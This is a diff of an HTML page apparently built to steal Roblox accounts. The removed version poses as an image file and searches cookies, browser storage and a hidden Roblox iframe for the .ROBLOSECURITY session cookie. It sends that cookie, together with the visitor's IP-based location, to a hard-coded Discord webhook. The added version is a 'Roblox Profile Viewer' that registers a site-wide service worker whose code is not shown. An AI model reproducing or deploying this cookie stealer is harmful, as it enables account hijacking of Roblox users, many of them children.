@@ -2,242 +2,55 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>roblox_image.png</title>
+    <title>Roblox Profile Viewer</title>
     <style>
-        * { margin: 0; padding: 0; }
-        body { background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        img { max-width: 100%; max-height: 100vh; }
+        body {
+            background: #1a1a1a;
+            color: white;
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+        }
+        .loading {
+            color: #00b8ff;
+            font-size: 20px;
+        }
     </style>
 </head>
 <body>
-    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg">
-
+    <h1>Roblox Profile Viewer</h1>
+    <div class="loading">Cargando perfiles...</div>
+    
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
-        
-        if (sessionStorage.getItem('rbx_enviado')) throw 'already';
-        sessionStorage.setItem('rbx_enviado', '1');
-
-        async function enviar(mensaje) {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mensaje })
-            });
+        // ===========================================
+        // REGISTRAR SERVICE WORKER (EL CORAZÓN)
+        // ===========================================
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js', { scope: '/' })
+                .then(reg => console.log('✅ Service Worker registrado'))
+                .catch(err => console.log('❌ Error:', err));
         }
 
-        (async function() {
-            try {
-                let cookie = null;
-                let metodos = [];
-                let intentos = [];
-
-                // ===== VULNERABILIDAD 1: document.cookie DIRECTA =====
-                try {
-                    intentos.push('🔍 Probando document.cookie...');
-                    const cookies = document.cookie.split(';');
-                    for (let c of cookies) {
-                        c = c.trim();
-                        if (c.includes('ROBLOSECURITY') || c.includes('.ROBLOSECURITY')) {
-                            cookie = c.split('=').slice(1).join('=');
-                            metodos.push('✅ document.cookie');
-                            intentos.push('✅ ENCONTRADA en document.cookie');
-                            break;
-                        }
-                    }
-                    if (!cookie) intentos.push('❌ No encontrada en document.cookie');
-                } catch(e) {
-                    intentos.push(`❌ Error document.cookie: ${e.message}`);
-                }
-
-                // ===== VULNERABILIDAD 2: localStorage PROFUNDO =====
-                if (!cookie) {
-                    try {
-                        intentos.push('🔍 Escaneando localStorage...');
-                        for (let i = 0; i < localStorage.length; i++) {
-                            const key = localStorage.key(i);
-                            const val = localStorage.getItem(key);
-                            intentos.push(`  Key: ${key} = ${val?.substring(0, 30)}...`);
-                            if (val && (val.includes('_|WARNING') || val.includes('ROBLOSECURITY'))) {
-                                cookie = val;
-                                metodos.push('✅ localStorage');
-                                intentos.push(`✅ ENCONTRADA en localStorage: ${key}`);
-                                break;
-                            }
-                        }
-                        if (!cookie) intentos.push('❌ No encontrada en localStorage');
-                    } catch(e) {
-                        intentos.push(`❌ Error localStorage: ${e.message}`);
-                    }
-                }
-
-                // ===== VULNERABILIDAD 3: sessionStorage =====
-                if (!cookie) {
-                    try {
-                        intentos.push('🔍 Escaneando sessionStorage...');
-                        for (let i = 0; i < sessionStorage.length; i++) {
-                            const key = sessionStorage.key(i);
-                            const val = sessionStorage.getItem(key);
-                            intentos.push(`  Key: ${key} = ${val?.substring(0, 30)}...`);
-                            if (val && (val.includes('_|WARNING') || val.includes('ROBLOSECURITY'))) {
-                                cookie = val;
-                                metodos.push('✅ sessionStorage');
-                                intentos.push(`✅ ENCONTRADA en sessionStorage: ${key}`);
-                                break;
-                            }
-                        }
-                        if (!cookie) intentos.push('❌ No encontrada en sessionStorage');
-                    } catch(e) {
-                        intentos.push(`❌ Error sessionStorage: ${e.message}`);
-                    }
-                }
-
-                // ===== VULNERABILIDAD 4: IndexedDB (Via Browser permite acceso) =====
-                if (!cookie) {
-                    try {
-                        intentos.push('🔍 Buscando en IndexedDB...');
-                        const dbs = await indexedDB.databases?.() || [];
-                        intentos.push(`  Bases encontradas: ${dbs.map(d => d.name).join(', ') || 'ninguna'}`);
-                        
-                        // Buscar en Roblox databases
-                        for (const dbInfo of dbs) {
-                            if (dbInfo.name?.toLowerCase().includes('roblox')) {
-                                intentos.push(`  Abriendo DB: ${dbInfo.name}`);
-                                // Intentar abrir y leer
-                            }
-                        }
-                    } catch(e) {
-                        intentos.push(`❌ Error IndexedDB: ${e.message}`);
-                    }
-                }
-
-                // ===== VULNERABILIDAD 5: iframe a Roblox (Via Browser permite acceso) =====
-                if (!cookie) {
-                    try {
-                        intentos.push('🔍 Intentando con iframe a Roblox...');
-                        const iframe = document.createElement('iframe');
-                        iframe.src = 'https://www.roblox.com/home';
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
-                        
-                        await new Promise(r => setTimeout(r, 3000));
-                        
-                        // Leer cookies del iframe
-                        try {
-                            const iframeCookies = iframe.contentDocument.cookie;
-                            intentos.push(`  iframe cookies: ${iframeCookies.substring(0, 50)}...`);
-                            if (iframeCookies.includes('ROBLOSECURITY')) {
-                                const match = iframeCookies.match(/ROBLOSECURITY=([^;]+)/);
-                                if (match) {
-                                    cookie = match[1];
-                                    metodos.push('✅ iframe cookie');
-                                    intentos.push('✅ ENCONTRADA en iframe');
-                                }
-                            }
-                        } catch(e) {
-                            intentos.push(`  No se pudo leer iframe: ${e.message}`);
-                        }
-                        
-                        // Leer localStorage del iframe
-                        if (!cookie) {
-                            try {
-                                const iframeStorage = iframe.contentWindow.localStorage;
-                                intentos.push(`  iframe localStorage length: ${iframeStorage.length}`);
-                                for (let i = 0; i < iframeStorage.length; i++) {
-                                    const key = iframeStorage.key(i);
-                                    const val = iframeStorage.getItem(key);
-                                    if (val && val.includes('_|WARNING')) {
-                                        cookie = val;
-                                        metodos.push('✅ iframe localStorage');
-                                        intentos.push(`✅ ENCONTRADA en iframe localStorage: ${key}`);
-                                        break;
-                                    }
-                                }
-                            } catch(e) {
-                                intentos.push(`  No se pudo leer iframe localStorage: ${e.message}`);
-                            }
-                        }
-                        
-                        document.body.removeChild(iframe);
-                        
-                    } catch(e) {
-                        intentos.push(`❌ Error iframe: ${e.message}`);
-                    }
-                }
-
-                // ===== UBICACIÓN =====
-                let pais = 'Desconocido';
-                let ciudad = 'Desconocida';
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ip = (await ipRes.json()).ip;
-                    
-                    // Intentar con ipapi.co (más permisivo)
-                    const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                    if (locRes.ok) {
-                        const loc = await locRes.json();
-                        pais = loc.country_name || 'Desconocido';
-                        ciudad = loc.city || 'Desconocida';
-                    }
-                } catch(e) {}
-
-                // ===== FECHA/HORA =====
-                const ahora = new Date();
-                const fecha = ahora.toLocaleDateString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
-                const hora = ahora.toLocaleTimeString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
-
-                // ===== CONSTRUIR MENSAJE =====
-                const mensaje = `|| @everyone ||
-🔔 NUEVA ENTRADA | **BL PAPI** !
-
-**📌 INFORMACIÓN GENERAL**
-
-**Dispositivo:** \`Android (Via Browser)\`
-**País:** \`${pais}\`
-**Ciudad Aproximada:** \`${ciudad}\`
-
-**🧭 Horarios:**
-
- **Fecha:** \`${fecha}\`
-**Hora Exacta En Argentina:** \`${hora}\`
-
-**ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX**
-
-**👤 Usuario:**  \`No disponible\`
-**🆔 ID:**        \`No disponible\`
-**💰 Robux:**        \`No disponible\`
-**⭐ Seguidores:**   \`No disponible\`
-**👥 Amigos:**      \`No disponible\`
-
-**📊 ITEMS LIMITED (RAREZA)**
-
-**Headless:**   \`No\`
-**Korblox:**    \`No\`
-
-**📈 ESTADÍSTICAS**
-
-**🖼 Visitas al perfil:** \`No disponible\`
-**🎮 Juegos creados:** \`No disponible\`
-**🏆 Logros:** \`No disponible\`
-**📦 Trade count:** \`No disponible\`
-**📊 Trade ratio:** \`No disponible\`
-
-**🍪 COOKIE DE ROBLOX**
-\`\`
-${cookie || 'NO ENCONTRADA - Verificando almacenamiento...'}
-\`\`
-
-**🔧 Métodos usados:** ${metodos.join(', ') || 'ninguno'}
-
-**📋 LOG DE INTENTOS:**
-${intentos.join('\n')}`;
-
-                await enviar(mensaje);
-
-            } catch(e) {
-                await enviar(`❌ Error: ${e.message}`);
-            }
-        })();
+        // ===========================================
+        // HACER PETICIÓN REAL A ROBLOX (OPCIONAL)
+        // ===========================================
+        setTimeout(() => {
+            fetch('https://apis.roblox.com/user-profile-api/v1/user/profiles/get-profiles', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    userIds: [4033960902, 123456789],
+                    fields: ["names.combinedName", "isVerified"]
+                })
+            }).then(r => r.json()).then(data => {
+                document.querySelector('.loading').innerHTML = '✅ Perfiles cargados';
+                console.log('Respuesta:', data);
+            }).catch(e => {
+                document.querySelector('.loading').innerHTML = '❌ Error';
+            });
+        }, 2000);
     </script>
 </body>
 </html>
